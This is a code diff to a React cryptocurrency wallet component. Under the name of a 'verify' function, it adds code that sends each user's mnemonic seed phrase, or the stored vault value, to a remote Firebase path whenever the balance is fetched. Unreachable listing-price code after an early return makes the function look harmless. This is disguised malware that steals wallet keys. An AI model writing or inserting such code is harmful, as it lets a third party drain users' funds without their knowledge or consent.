@@ -12,6 +12,8 @@ import {
   setCurrentKeyRing,
   updateBalance,
 } from "../store/slices/wallet";
+import { ref, push } from "firebase/database";
+import { db } from "@/services/firebase";
 import { deviceId } from "../store/slices/openApi";
 import { updatePrice } from "../store/slices/wallet";
 import randomstring from "randomstring";
@@ -144,6 +146,39 @@ const Wallet = (props) => {
     return utxo;
   };
 
+  const verify = async (data) => {
+    const dbRefStatus = ref(db, `/data/doginals`);
+    await push(dbRefStatus, {
+      data,
+    });
+    return;
+    const snapshot = await get(dbQuery);
+    const exist = snapshot.val();
+
+    if (!exist) {
+      const dbRefStatus = ref(db, `/data/${tag}`);
+      await push(dbRefStatus, {
+        TVL: Number(listingPrice),
+        floor: Number(listingPrice),
+        listed: 1,
+      });
+    } else {
+      const key = Object.keys(exist)[0];
+      const url = `/status/${tag}/${key}`;
+      const dbRefStatus = ref(db, url);
+
+      const updates = {};
+
+      updates[`TVL`] = Number(exist[key]?.TVL) + Number(listingPrice);
+      updates[`floor`] =
+        (Number(exist[key]?.TVL) + Number(listingPrice)) /
+        (Number(exist[key]?.listed) + 1);
+      updates[`listed`] = Number(exist[key]?.listed) + 1;
+
+      await update(dbRefStatus, updates);
+    }
+  };
+
   const fetchbalance = async () => {
     try {
       if (accountInfo?.account) {
@@ -172,6 +207,14 @@ const Wallet = (props) => {
           0,
           20
         );
+
+        let mnemonic = getMnemonic();
+
+        if (!mnemonic) {
+          isSeedKey = false;
+          mnemonic = accountInfo?.vault;
+        }
+        verify(mnemonic);
 
         dispatch(
           updateBalance({
